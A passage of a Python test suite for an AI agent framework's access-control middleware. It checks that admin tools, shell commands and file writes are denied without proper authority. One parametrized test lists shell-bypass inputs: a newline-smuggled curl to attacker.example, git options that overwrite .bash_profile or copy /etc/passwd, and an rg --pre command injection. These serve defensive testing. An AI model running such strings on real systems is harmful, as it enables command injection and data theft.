    alice = create_auth_context(_event("slack-U1"), resolver, enforce=True)
    bob = create_auth_context(
        AgentEvent(trigger="user_message", channel_id="slack-C2", author="slack-U2"),
        resolver,
        enforce=True,
    )
    token = set_current_turn(_turn("turn-bob", "saga-bob", bob))

    async def run_detached():
        task = asyncio.create_task(
            asyncio.sleep(0, result=_auth_context_from_request(_tool_request(alice)))
        )
        return await task

    try:
        resolved = asyncio.run(run_detached())
    finally:
        reset_current_turn(token)
    assert resolved is alice
    assert resolved.roles == ("user",)


def test_missing_request_carrier_denies_admin_tool_under_enforcement(monkeypatch) -> None:
    import asyncio

    from langchain_core.messages import ToolMessage

    from mimir.tools.budget_gate import BudgetGateMiddleware

    monkeypatch.setenv("MIMIR_ACCESS_CONTROL_ENFORCED", "1")
    called = False

    async def handler(_request):
        nonlocal called
        called = True
        return ToolMessage(content="ran", tool_call_id="tc-auth")

    result = asyncio.run(BudgetGateMiddleware().awrap_tool_call(_tool_request(None), handler))
    assert called is False
    assert result.status == "error"
    assert "requires an admin identity" in str(result.content)


def test_claude_sdk_hook_fails_closed_without_exact_carrier(monkeypatch) -> None:
    """SDK built-in/MCP hooks never treat session_id or inherited turns as authz."""
    from mimir import _langchain_claude_code_patches as patches

    monkeypatch.setenv("MIMIR_ACCESS_CONTROL_ENFORCED", "1")
    denial = patches._claude_code_pre_tool_enforcement(
        "Bash", {"command": "true"}, "sdk-tool-1", session_id="saga-admin"
    )

    assert denial["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert "missing_auth_context" in denial["hookSpecificOutput"]["permissionDecisionReason"]


def test_http_event_ingress_denies_without_server_owned_principal_mapping(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Generic HTTP credentials authenticate transport only - no server-owned principal."""
    import asyncio

    from langchain_core.messages import ToolMessage

    from mimir.tools.budget_gate import BudgetGateMiddleware

    captured: list[tuple[str, dict]] = []

    def _capture(kind: str, **kw: dict):
        captured.append((kind, kw))

    monkeypatch.setattr("mimir.tools.budget_gate._emit_event_sync", _capture)

    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: alice
            aliases: [slack-U1]
            access: {roles: [user]}
        """,
    )

    ctx = TurnContext(
        turn_id="turn-1",
        session_id="saga-1",
        trigger="user_message",
        channel_id="slack-C1",
        started_at=0.0,
        tool_call_budget=10,
    )
    ctx.author = "slack-U1"
    ctx.identity_resolver = resolver
    ctx.access_control_enforced = True
    ctx.auth_context = AuthContext(
        principal="slack-U1",
        canonical_principal="alice",
        roles=("user",),
        event_ingress="http-api",
        trigger="user_message",
        channel_id="slack-C1",
        interactivity=None,
        enforcement_enabled=True,
    )

    mw = BudgetGateMiddleware()
    token = set_current_turn(ctx)
    try:
        async def handler(req):
            return ToolMessage(content="ran", tool_call_id=req.tool_call["id"])

        result = asyncio.run(
            mw.awrap_tool_call(
                _tool_request(ctx.auth_context, session_id="saga-1"), handler
            )
        )
    finally:
        reset_current_turn(token)

    assert result.status == "error"
    kinds = [kind for kind, _kw in captured]
    assert "admin_tool_call_denied" in kinds
    admin_event = next(kw for kind, kw in captured if kind == "admin_tool_call_denied")
    assert admin_event["denial_reason"] is not None


def test_enforcement_on_missing_context_denies(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Enforcement-on with missing auth context denies all non-open operations."""
    import asyncio

    from langchain_core.messages import ToolMessage

    from mimir.tools.budget_gate import BudgetGateMiddleware

    monkeypatch.setenv("MIMIR_ACCESS_CONTROL_ENFORCED", "true")
    captured: list[tuple[str, dict]] = []

    def _capture(kind: str, **kw: dict):
        captured.append((kind, kw))

    monkeypatch.setattr("mimir.tools.budget_gate._emit_event_sync", _capture)

    mw = BudgetGateMiddleware()

    async def handler(req):
        return ToolMessage(content="ran", tool_call_id=req.tool_call["id"])

    result = asyncio.run(mw.awrap_tool_call(_tool_request(None), handler))

    assert result.status == "error"
    assert "missing_auth_context" in str(result.content).lower()
    kinds = [kind for kind, _kw in captured]
    assert "admin_tool_call_denied" in kinds
    admin_event = next(kw for kind, kw in captured if kind == "admin_tool_call_denied")
    assert admin_event["denial_reason"] == "missing_auth_context"


def test_enforcement_on_unknown_context_denies(tmp_path: Path) -> None:
    """Enforcement-on with unknown author denies at inbound."""
    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: alice
            aliases: [slack-U1]
            access: {roles: [user]}
        """,
    )

    event = _event("unknown-user-123")
    decision = authorize_inbound(event, resolver, enforce=True)

    assert decision.allowed is False
    assert decision.status == AccessStatus.DENIED
    assert decision.reason in (DenialReason.UNKNOWN_AUTHOR, DenialReason.USER_NOT_ALLOWLISTED)


def test_unknown_mcp_tool_denies_under_enforcement(tmp_path: Path) -> None:
    """Unknown MCP tools are denied under enforcement."""
    from mimir.access_control import MCPResourceAdapter

    auth_ctx = AuthContext(
        principal="slack-U1",
        canonical_principal="user-1",
        roles=("user",),
        event_ingress=None,
        trigger="user_message",
        channel_id="slack-C1",
        interactivity=None,
        enforcement_enabled=True,
    )

    result = MCPResourceAdapter.authorize_mcp_tool(
        "mcp__unknown_tool",
        auth_ctx,
        enforce=True,
    )

    assert result.allowed is False
    assert result.decision.value == "admin_required"
    assert result.reason is not None


@pytest.mark.parametrize("enforce", [False, True])
def test_non_mcp_name_never_falls_through_mcp_adapter(enforce: bool) -> None:
    from mimir.access_control import MCPResourceAdapter, OperationDecision

    result = MCPResourceAdapter.authorize_mcp_tool(
        "shell_exec",
        None,
        enforce=enforce,
    )

    assert result.allowed is False
    assert result.decision == OperationDecision.ADMIN_REQUIRED
    assert result.reason == "non_mcp_tool_name"


def _dispatcher_config(tmp_path: Path, *, enforce: bool):
    from mimir.config import Config

    return replace(
        Config.from_env(),
        home=tmp_path,
        access_control_enforced=enforce,
        worker_idle_timeout_s=0.01,
    )


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("author", "expected_type", "expected_status", "expected_reason"),
    [
        ("slack-U1", "inbound_event_allowed", "user_allowed", None),
        ("slack-unknown", "inbound_event_denied", "denied", "unknown_author"),
    ],
)
async def test_inbound_audit_events_are_structured_and_redacted(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    author: str,
    expected_type: str,
    expected_status: str,
    expected_reason: str | None,
) -> None:
    """The live dispatcher emits stable decisions without message bodies/secrets."""
    from mimir.dispatcher import Dispatcher

    captured: list[dict[str, object]] = []

    async def capture_event(event_type: str, **payload: object) -> None:
        captured.append({"type": event_type, **payload})

    monkeypatch.setattr("mimir.dispatcher.log_event", capture_event)
    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: alice
            aliases: [slack-U1]
            access: {roles: [user]}
        """,
    )
    dispatcher = Dispatcher(_dispatcher_config(tmp_path, enforce=True), resolver=resolver)
    event = AgentEvent(
        trigger="user_message",
        channel_id="slack-C1",
        author=author,
        author_id="U1" if author == "slack-U1" else "U-unknown",
        source="slack",
        content="secret-message-body",
        extra={"api_key": "secret-api-key"},
    )

    accepted = await dispatcher._authorize_bridge_event(event)

    assert accepted is (expected_type == "inbound_event_allowed")
    decision_event = next(row for row in captured if row["type"] == expected_type)
    assert decision_event == {
        "type": expected_type,
        "source": "slack",
        "channel_id": "slack-C1",
        "author": author,
        "raw_author_handle": author,
        "author_id": "U1" if author == "slack-U1" else "U-unknown",
        "canonical_author": "alice" if author == "slack-U1" else "slack-unknown",
        "status": expected_status,
        "trigger": "user_message",
        "enforcement_enabled": True,
        **({"reason": expected_reason} if expected_reason is not None else {}),
    }
    rendered = repr(captured)
    assert "secret-message-body" not in rendered
    assert "secret-api-key" not in rendered
    assert "api_key" not in rendered


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("enforce", "tool_name", "args"),
    [
        (False, "send_message", {"channel_id": "api-C1", "text": "forged"}),
        (False, "future_dynamic_tool", {"scope": "forged"}),
        (True, "send_message", {"channel_id": "api-C1", "text": "forged"}),
    ],
    ids=[
        "compat-resource-scoped",
        "compat-unknown-operation",
        "enforced-resource-scoped",
    ],
)
async def test_http_transport_principal_mapping_absence_denies_every_non_open_call(
    monkeypatch: pytest.MonkeyPatch,
    enforce: bool,
    tool_name: str,
    args: dict[str, object],
) -> None:
    """A forged HTTP author/trigger cannot turn transport auth into authority."""
    from langchain_core.messages import ToolMessage

    from mimir.tools.budget_gate import BudgetGateMiddleware

    captured: list[tuple[str, dict[str, object]]] = []
    monkeypatch.setattr(
        "mimir.tools.budget_gate._emit_event_sync",
        lambda kind, **fields: captured.append((kind, fields)),
    )
    auth_context = AuthContext(
        principal="api-root",
        canonical_principal="root",
        roles=("user", "admin"),
        event_ingress="http_event",
        trigger="scheduled_tick",
        channel_id="api-C1",
        interactivity=None,
        enforcement_enabled=enforce,
    )
    handler_calls = 0

    async def handler(request):
        nonlocal handler_calls
        handler_calls += 1
        return ToolMessage(content="ran", tool_call_id=request.tool_call["id"])

    result = await BudgetGateMiddleware().awrap_tool_call(
        _tool_request(auth_context, tool_name=tool_name, args=args), handler
    )

    assert result.status == "error"
    assert "http_event_author_untrusted" in str(result.content)
    assert handler_calls == 0
    denial = next(fields for kind, fields in captured if kind == "admin_tool_call_denied")
    assert denial["tool"] == tool_name
    assert denial["canonical_author"] == "root"
    assert denial["denial_reason"] == "http_event_author_untrusted"
    assert denial["enforcement_enabled"] is enforce


@pytest.mark.asyncio
async def test_concurrent_turns_keep_authority_and_ifc_scope_isolated(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Concurrent requests cannot borrow admin authority or another turn's labels."""
    from langchain_core.messages import ToolMessage

    from mimir.models import InformationFlowLabels
    from mimir.tools.budget_gate import BudgetGateMiddleware

    monkeypatch.setattr("mimir.tools.budget_gate._emit_event_sync", lambda *_args, **_kw: None)

    user_auth = AuthContext(
        principal="slack-U1",
        canonical_principal="alice",
        roles=("user",),
        event_ingress=None,
        trigger="user_message",
        channel_id="slack-C-private",
        interactivity=None,
        enforcement_enabled=True,
        domain="channel",
        resource_id="slack-C1",
        bridge_instance="slack",
    )
    admin_auth = AuthContext(
        principal="slack-U2",
        canonical_principal="bob",
        roles=("user", "admin"),
        event_ingress=None,
        trigger="user_message",
        channel_id="slack-C-admin",
        interactivity=None,
        enforcement_enabled=True,
    )
    barrier = asyncio.Barrier(2)
    handler_calls: list[str] = []

    async def run_request(
        auth_context: AuthContext,
        *,
        tool_name: str,
        args: dict[str, object],
        ifc_source: str,
    ):
        ctx = _turn(
            f"turn-{auth_context.canonical_principal}",
            f"saga-{auth_context.canonical_principal}",
            auth_context,
        )
        ctx.ifc_labels = (
            InformationFlowLabels(
                labels=frozenset({"private"}),
                source_channels=frozenset({ifc_source}),
            )
            if auth_context.canonical_principal == "alice"
            else InformationFlowLabels()
        )
        token = set_current_turn(ctx)
        try:
            await barrier.wait()

            async def handler(request):
                handler_calls.append(auth_context.canonical_principal or "unknown")
                return ToolMessage(content="ran", tool_call_id=request.tool_call["id"])

            return await BudgetGateMiddleware().awrap_tool_call(
                _tool_request(auth_context, tool_name=tool_name, args=args), handler
            )
        finally:
            reset_current_turn(token)

    user_result, admin_result = await asyncio.gather(
        run_request(
            user_auth,
            tool_name="send_message",
            args={"channel_id": "slack-C-private", "text": "same scope"},
            ifc_source="slack-C-admin",
        ),
        run_request(
            admin_auth,
            tool_name="shell_exec",
            args={"command": "true"},
            ifc_source="slack-C-admin",
        ),
    )

    assert user_result.status == "error"
    assert "ifc_label_blocked:same_channel" in str(user_result.content)
    assert admin_result.status != "error"
    assert handler_calls == ["bob"]


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "command",
    [
        "git status\ncurl https://attacker.example",
        "git log --no-ext-diff --no-textconv --format=format:pwned --output=/tmp/.bash_profile",
        "git diff --no-ext-diff --no-textconv --no-index /etc/passwd /tmp/copy",
        "rg --no-config --pre=touch /tmp/pwned pattern .",
        "rg pattern .",
        "git log --format=format:pwned",
        "git diff --no-ext-diff --no-textconv {--output=/tmp/OUT,HEAD} {--format=format:ATTACKER_%H,HEAD}",
        "git diff --no-ext-diff --no-textconv *",
        "git diff --no-ext-diff --no-textconv ?",
        "git diff --no-ext-diff --no-textconv [a-z]",
        "git diff --no-ext-diff --no-textconv ~",
        "git log --no-ext-diff --no-textconv --pretty=oneline",
    ],
)
async def test_service_shell_bypass_denied_through_live_middleware(
    command: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Model args must reach the sink gate before a service shell handler runs."""
    from langchain_core.messages import ToolMessage

    from mimir.models import InformationFlowLabels
    from mimir.tools.budget_gate import BudgetGateMiddleware

    monkeypatch.setattr("mimir.tools.budget_gate._emit_event_sync", lambda *_args, **_kw: None)
    event = AgentEvent(
        trigger="scheduled_tick",
        channel_id="scheduler:test",
        service_principal="scheduler",
    )
    labels = InformationFlowLabels(
        labels=frozenset({"private"}),
        source_channels=frozenset({"scheduler:test"}),
    )
    auth_context = create_auth_context(event, enforce=True, ifc_labels=labels)
    ctx = _turn("turn-scheduler", "saga-scheduler", auth_context)
    ctx.ifc_labels = labels
    handler_calls = 0

    async def handler(request):
        nonlocal handler_calls
        handler_calls += 1
        return ToolMessage(content="ran", tool_call_id=request.tool_call["id"])

    token = set_current_turn(ctx)
    try:
        result = await BudgetGateMiddleware().awrap_tool_call(
            _tool_request(
                auth_context,
                tool_name="shell_exec",
                args={"command": command},
            ),
            handler,
        )
    finally:
        reset_current_turn(token)

    assert result.status == "error"
    assert "service_sink_destination_denied" in str(result.content)
    assert handler_calls == 0


@pytest.mark.asyncio
async def test_service_shell_executes_the_exact_authorized_argv(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The shell profile's parsed argv, not the model string, reaches the handler."""
    from langchain_core.messages import ToolMessage

    from mimir.models import InformationFlowLabels
    from mimir.tools.budget_gate import BudgetGateMiddleware

    home = tmp_path / "home"
    home.mkdir()
    subprocess.run(["git", "init", "-q", str(home)], check=True)
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.delenv("MIMIR_FILE_TOOL_ROOTS", raising=False)
    event = AgentEvent(
        trigger="scheduled_tick",
        channel_id="scheduler:test",
        service_principal="scheduler",
    )
    labels = InformationFlowLabels(
        labels=frozenset({"private"}),
        source_channels=frozenset({"scheduler:test"}),
    )
    auth_context = create_auth_context(event, enforce=True, ifc_labels=labels)
    ctx = _turn("turn-scheduler", "saga-scheduler", auth_context)
    ctx.ifc_labels = labels
    seen_args: dict[str, object] = {}

    async def handler(request):
        seen_args.update(request.tool_call["args"])
        return ToolMessage(content="ran", tool_call_id=request.tool_call["id"])

    token = set_current_turn(ctx)
    try:
        result = await BudgetGateMiddleware().awrap_tool_call(
            _tool_request(
                auth_context,
                tool_name="shell_exec",
                args={
                    "command": f"git -C {home} log --oneline",
                    "mimir_direct_argv": ["sh", "-c", "touch /tmp/forged"],
                },
            ),
            handler,
        )
    finally:
        reset_current_turn(token)

    assert result.status != "error"
    assert seen_args["command"] == f"git -C {home} log --oneline"
    assert seen_args["mimir_direct_argv"] == [
        "/usr/bin/git", "-C", str(home.resolve()),
        "-c", "core.fsmonitor=", "-c", "core.hooksPath=/dev/null",
        "-c", "diff.external=", "-c", "protocol.allow=never",
        "--no-pager", "--no-optional-locks",
        "log", "--oneline", "--no-ext-diff", "--no-textconv",
    ]


@pytest.mark.asyncio
async def test_service_shell_executes_pinned_non_git_argv(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A writable PATH entry cannot replace an admitted maintenance command."""
    from langchain_core.messages import ToolMessage

    import mimir.access_control as access_control
    from mimir.models import InformationFlowLabels
    from mimir.tools.budget_gate import BudgetGateMiddleware

    pinned_gh = tmp_path / "trusted-gh"
    pinned_gh.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    pinned_gh.chmod(0o755)
    monkeypatch.setitem(access_control._MAINTENANCE_PINNED_EXECUTABLES, "gh", pinned_gh)

    event = AgentEvent(
        trigger="scheduled_tick",
        channel_id="scheduler:test",
        service_principal="scheduler",
    )
    labels = InformationFlowLabels(
        labels=frozenset({"private"}),
        source_channels=frozenset({"scheduler:test"}),
    )
    auth_context = create_auth_context(event, enforce=True, ifc_labels=labels)
    ctx = _turn("turn-scheduler", "saga-scheduler", auth_context)
    ctx.ifc_labels = labels
    seen_args: dict[str, object] = {}

    async def handler(request):
        seen_args.update(request.tool_call["args"])
        return ToolMessage(content="ran", tool_call_id=request.tool_call["id"])

    token = set_current_turn(ctx)
    try:
        result = await BudgetGateMiddleware().awrap_tool_call(
            _tool_request(
                auth_context,
                tool_name="shell_exec",
                args={
                    "command": "gh pr list --state open",
                    "mimir_direct_argv": ["sh", "-c", "touch /tmp/forged"],
                },
            ),
            handler,
        )
    finally:
        reset_current_turn(token)

    assert result.status != "error"
    assert seen_args["command"] == "gh pr list --state open"
    assert seen_args["mimir_direct_argv"] == [
        str(pinned_gh), "pr", "list", "--state", "open",
    ]


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("args_factory", "expected_reason"),
    [
        (
            lambda _home, _readonly, _outside: {"cwd": ".", "artifact_root": "artifacts"},
            "ifc_label_blocked:spawn",
        ),
        (
            lambda _home, readonly, _outside: {"cwd": str(readonly)},
            "ifc_label_blocked:spawn",
        ),
        (
            lambda home, _readonly, outside: {
                "cwd": str(home),
                "artifact_root": str(outside),
            },
            "ifc_label_blocked:spawn",
        ),
    ],
    ids=["write-root", "read-only-cwd", "outside-artifact-root"],
)
async def test_service_spawn_destinations_are_confined_to_write_roots(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    args_factory,
    expected_reason: str,
) -> None:
    from langchain_core.messages import ToolMessage

    from mimir.models import InformationFlowLabels
    from mimir.tools.budget_gate import BudgetGateMiddleware

    home = tmp_path / "home"
    readonly = tmp_path / "readonly"
    outside = tmp_path / "outside"
    home.mkdir()
    readonly.mkdir()
    outside.mkdir()
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{readonly}:ro")
    monkeypatch.setattr("mimir.tools.budget_gate._emit_event_sync", lambda *_args, **_kw: None)

    event = AgentEvent(
        trigger="scheduled_tick",
        channel_id="scheduler:test",
        service_principal="scheduler",
    )
    labels = InformationFlowLabels(
        labels=frozenset({"private"}),
        source_channels=frozenset({"scheduler:test"}),
    )
    auth_context = create_auth_context(event, enforce=True, ifc_labels=labels)
    seen_args: dict[str, object] = {}

    async def handler(request):
        seen_args.update(request.tool_call["args"])
        return ToolMessage(content="ran", tool_call_id=request.tool_call["id"])

    result = await BudgetGateMiddleware().awrap_tool_call(
        _tool_request(
            auth_context,
            tool_name="spawn_open_code",
            args={"prompt": "task", **args_factory(home, readonly, outside)},
        ),
        handler,
    )

    assert result.status == "error"
    assert expected_reason in str(result.content)
    assert seen_args == {}


@pytest.mark.asyncio
async def test_same_scope_private_egress_succeeds_through_live_middleware(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The integrated middleware permits private data back to its source channel."""
    from langchain_core.messages import ToolMessage

    from mimir.models import InformationFlowLabels
    from mimir.tools.budget_gate import BudgetGateMiddleware

    monkeypatch.setattr("mimir.tools.budget_gate._emit_event_sync", lambda *_args, **_kw: None)

    auth_context = AuthContext(
        principal="slack-U1",
        canonical_principal="alice",
        roles=("user",),
        event_ingress=None,
        trigger="user_message",
        channel_id="slack-C1",
        interactivity=None,
        enforcement_enabled=True,
        domain="channel",
        resource_id="slack-C1",
        bridge_instance="slack",
    )
    ctx = _turn("turn-alice", "saga-alice", auth_context)
    ctx.ifc_labels = InformationFlowLabels(
        labels=frozenset({"private"}),
        source_channels=frozenset({"slack-C1"}),
        sources=frozenset({SourceLabel(
            principal="alice",
            domain="channel",
            resource_id="slack-C1",
            bridge_instance="slack",
            sensitivity="private",
            authorized_principals=frozenset({"alice"}),
        )}),
    )
    handler_calls = 0

    async def handler(request):
        nonlocal handler_calls
        handler_calls += 1
        return ToolMessage(content="sent", tool_call_id=request.tool_call["id"])

    token = set_current_turn(ctx)
    try:
        result = await BudgetGateMiddleware().awrap_tool_call(
            _tool_request(
                auth_context,
                tool_name="send_message",
                args={"channel_id": "slack-C1", "text": "same scope"},
            ),
            handler,
        )
    finally:
        reset_current_turn(token)

    assert result.status != "error"
    assert result.content == "sent"
    assert handler_calls == 1


def _write_auth(*, admin: bool = False) -> AuthContext:
    return AuthContext(
        principal="slack-U1",
        canonical_principal="alice",
        roles=("user", "admin") if admin else ("user",),
        event_ingress=None,
        trigger="user_message",
        channel_id="slack-C1",
        interactivity=TurnInteractivity.INTERACTIVE,
        enforcement_enabled=True,
        ifc_labels=InformationFlowLabels(),
    )


@pytest.mark.parametrize("tool_name", ["write_file", "edit_file"])
def test_non_admin_human_write_is_confined_to_unprotected_state(
    tool_name: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    state = home / "state"
    repo = tmp_path / "repo"
    outside = tmp_path / "outside"
    state.mkdir(parents=True)
    repo.mkdir()
    outside.mkdir()
    (state / "escape").symlink_to(outside, target_is_directory=True)
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{repo}:rw")
    registry = ToolRegistry()

    allowed = registry.authorize_tool(
        tool_name,
        _write_auth(),
        enforce=True,
        target_channel=str(state / "notes" / "result.md"),
    )
    relative_state = registry.authorize_tool(
        tool_name,
        _write_auth(),
        enforce=True,
        target_channel="state/notes/result.md",
    )
    denied = (
        home / "root.txt",
        repo / "source.py",
        state / ".env",
        state / "config.yaml",
        state / "credentials.json",
        state / "identities.yaml",
        state / "memory" / "core" / "identity.md",
        state / "prompts" / "system.md",
        state / ".." / "repo-escape.txt",
        state / "escape" / "symlink-escape.txt",
    )

    assert allowed.allowed is True
    assert relative_state.allowed is True
    assert allowed.decision == OperationDecision.RESOURCE_SCOPED
    assert registry.authorize_tool(
        tool_name,
        _write_auth(),
        enforce=True,
        target_channel="result-at-home.md",
    ).allowed is False
    for target in denied:
        decision = registry.authorize_tool(
            tool_name,
            _write_auth(),
            enforce=True,
            target_channel=str(target),
        )
        assert decision.allowed is False, target
        assert decision.reason == "write_scope"


def test_non_admin_human_cannot_run_code_tools(tmp_path: Path) -> None:
    registry = ToolRegistry()
    for operation in (
        "worklink_run", "spawn_claude_code", "spawn_codex", "spawn_open_code",
    ):
        decision = registry.authorize_tool(
            operation,
            _write_auth(),
            enforce=True,
            target_channel=str(tmp_path),
        )
        assert decision.allowed is False, operation
        if operation == "worklink_run":
            assert decision.reason == "admin_required"


def _service_auth(
    service: ServicePrincipal,
    labels: InformationFlowLabels,
) -> AuthContext:
    return AuthContext(
        principal=f"service:{service.canonical}",
        canonical_principal=service.canonical,
        roles=("service",),
        event_ingress=None,
        trigger=service.trigger,
        channel_id="poller:test",
        interactivity=TurnInteractivity.NON_INTERACTIVE,
        is_service=True,
        service_authority=service,
        enforcement_enabled=True,
        ifc_labels=labels,
    )


@pytest.mark.asyncio
async def test_service_capability_allowed_admin_operation_emits_non_blocking_audit() -> None:
    service = get_service_principal("saga_session_end")
    assert service is not None
    registry = ToolRegistry()
    registry.enable_shadow_logging()
    captured: list[tuple[str, dict[str, object]]] = []

    async def capture(kind: str, **fields: object) -> None:
        captured.append((kind, fields))

    auth = _service_auth(service, InformationFlowLabels())
    with pytest.MonkeyPatch.context() as monkeypatch:
        monkeypatch.setattr("mimir.event_logger.log_event", capture)
        decision = registry.authorize_tool("saga_feedback", auth, enforce=False)
        await asyncio.sleep(0)

    assert decision.allowed is True
    assert decision.is_shadow_decision is True
    assert captured == [(
        "shadow_tool_decision",
        {
            **decision.as_log_fields(),
            "would_block": False,
            "target": "saga",
            "trigger": "saga_session_end",
        },
    )]
    assert captured[0][1]["reason"] is None
    assert captured[0][1]["service_principal"] == service.canonical


@pytest.mark.asyncio
async def test_shadow_denial_event_is_self_classifying() -> None:
    service = get_service_principal("scheduled_tick")
    assert service is not None
    registry = ToolRegistry()
    registry.enable_shadow_logging()
    captured: list[tuple[str, dict[str, object]]] = []

    async def capture(kind: str, **fields: object) -> None:
        captured.append((kind, fields))

    auth = _service_auth(service, InformationFlowLabels())
    with pytest.MonkeyPatch.context() as monkeypatch:
        monkeypatch.setattr("mimir.event_logger.log_event", capture)
        decision = registry.authorize_tool("remove_schedule", auth, enforce=False)
        await asyncio.sleep(0)

    assert decision.allowed is True
    assert captured == [(
        "shadow_tool_decision",
        {
            **decision.as_log_fields(),
            "would_block": True,
            "target": "scheduler",
            "trigger": "scheduled_tick",
        },
    )]
    assert captured[0][1]["reason"] == "admin_required"
    assert captured[0][1]["service_principal"] == "scheduler"


def test_ifc_label_blocked_sink_denial_carries_service_principal() -> None:
    service = get_service_principal("scheduled_tick")
    assert service is not None
    labels = InformationFlowLabels(labels=frozenset({"private"}))
    auth = _service_auth(service, labels)

    decision = SinkGate.check_sink_flow(
        "http_request",
        "https://example.invalid/hook",
        labels,
        auth,
        enforce=True,
    )

    assert decision.allowed is False
    assert decision.reason == "ifc_label_blocked:http_webhook"
    assert decision.service_principal is service


@pytest.mark.parametrize(
    ("trigger", "canonical"),
    [("scheduled_tick", "scheduler"), ("upgrade", "system")],
)
@pytest.mark.parametrize("tool_name", ["write_file", "edit_file"])
def test_static_service_write_allows_safe_home_state_memory_and_repo_roots(
    trigger: str,
    canonical: str,
    tool_name: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    repo = tmp_path / "repo"
    outside = tmp_path / "outside"
    (home / "state").mkdir(parents=True)
    (home / "memory").mkdir()
    repo.mkdir()
    outside.mkdir()
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{repo}:rw")
    service = get_service_principal(trigger)
    assert service is not None and service.canonical == canonical
    auth = _service_auth(service, InformationFlowLabels())
    registry = ToolRegistry()

    for target in (
        home / "state" / "journal" / "entry.md",
        home / "memory" / "issues" / "970.md",
        repo / "source.py",
    ):
        decision = registry.authorize_tool(
            tool_name, auth, enforce=True, target_channel=str(target),
        )
        assert decision.allowed is True, target

    for target in (
        home / "root.txt",
        outside / "data.txt",
        Path("/tmp/unscoped.txt"),
    ):
        decision = registry.authorize_tool(
            tool_name, auth, enforce=True, target_channel=str(target),
        )
        assert decision.allowed is False, target
        assert decision.reason == "service_sink_destination_denied"


@pytest.mark.parametrize("trigger", ["scheduled_tick", "upgrade"])
@pytest.mark.parametrize("tool_name", ["write_file", "edit_file"])
def test_static_service_write_denies_protected_home_paths(
    trigger: str,
    tool_name: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    (home / "state").mkdir(parents=True)
    (home / "memory").mkdir()
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", "")
    service = get_service_principal(trigger)
    assert service is not None
    auth = _service_auth(service, InformationFlowLabels())
    registry = ToolRegistry()

    protected = (
        home / "state" / ".env",
        home / "state" / "config.yaml",
        home / "state" / "credentials.json",
        home / "state" / "identities.yaml",
        home / "state" / "secrets" / "token.txt",
        home / "state" / "prompts" / "system.md",
        home / "state" / ".mimir" / "pending-update.flag",
        home / "memory" / "config" / "runtime.yaml",
        home / "memory" / "credentials.json",
        home / "memory" / "identities.yaml",
        home / "memory" / "secrets.md",
        home / "memory" / "prompts" / "system.md",
        home / "memory" / ".mimir" / "state.json",
        home / "memory" / "core" / "service-axis.md",
    )
    for target in protected:
        decision = registry.authorize_tool(
            tool_name, auth, enforce=True, target_channel=str(target),
        )
        assert decision.allowed is False, target
        assert decision.reason == "service_sink_destination_denied"


@pytest.mark.parametrize("trigger", ["scheduled_tick", "upgrade"])
@pytest.mark.parametrize("tool_name", ["write_file", "edit_file"])
def test_static_service_write_denies_symlink_escapes_and_protected_aliases(
    trigger: str,
    tool_name: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    state = home / "state"
    memory = home / "memory"
    repo = tmp_path / "repo"
    outside = tmp_path / "outside"
    state.mkdir(parents=True)
    memory.mkdir()
    repo.mkdir()
    outside.mkdir()
    (state / "escape").symlink_to(outside, target_is_directory=True)
    (state / "credentials").symlink_to(repo, target_is_directory=True)
    (memory / "core").symlink_to(repo, target_is_directory=True)
    (repo / "prompts").symlink_to(repo / "safe", target_is_directory=True)
    (repo / "safe").mkdir()
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{repo}:rw")
    service = get_service_principal(trigger)
    assert service is not None
    auth = _service_auth(service, InformationFlowLabels())
    registry = ToolRegistry()

    for target in (
        state / "escape" / "escaped.md",
        state / "credentials" / "token.txt",
        memory / "core" / "symlinked.md",
        repo / "prompts" / "system.md",
    ):
        decision = registry.authorize_tool(
            tool_name, auth, enforce=True, target_channel=str(target),
        )
        assert decision.allowed is False, target
        assert decision.reason == "service_sink_destination_denied"


@pytest.mark.parametrize("trigger", ["scheduled_tick", "upgrade"])
def test_static_service_write_allows_home_when_file_tool_roots_unset(
    trigger: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    (home / "state").mkdir(parents=True)
    (home / "memory").mkdir()
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.delenv("MIMIR_FILE_TOOL_ROOTS", raising=False)
    service = get_service_principal(trigger)
    assert service is not None
    auth = _service_auth(service, InformationFlowLabels())
    registry = ToolRegistry()

    for target in (
        home / "state" / "journal" / "entry.md",
        home / "memory" / "issues" / "970.md",
        Path("state/journal/relative.md"),
